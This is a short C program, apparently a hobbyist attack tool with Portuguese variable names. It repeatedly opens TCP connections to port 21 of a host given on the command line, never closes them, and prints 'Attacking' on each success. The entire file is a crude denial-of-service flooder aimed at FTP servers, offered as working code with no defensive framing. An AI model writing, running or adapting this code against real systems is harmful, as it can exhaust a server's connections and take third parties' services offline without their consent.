#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>

int main(int argc, char *argv[]){

	int meusocket;
	int conecta;

	int porta=21;
	char *destino;
	destino = argv[1];
	int active = 1;

	struct sockaddr_in alvo;

	while(active == 1){

	meusocket = socket(AF_INET,SOCK_STREAM,0);
	alvo.sin_family = AF_INET;
	alvo.sin_port= htons(porta);
	alvo.sin_addr.s_addr = inet_addr(destino);

	conecta = connect(meusocket, (struct sockaddr *)&alvo, sizeof alvo);

	if(conecta == 0){
		printf("Attacking %s on port %i \n", destino, porta);
	
	}else{
	}
	}
}
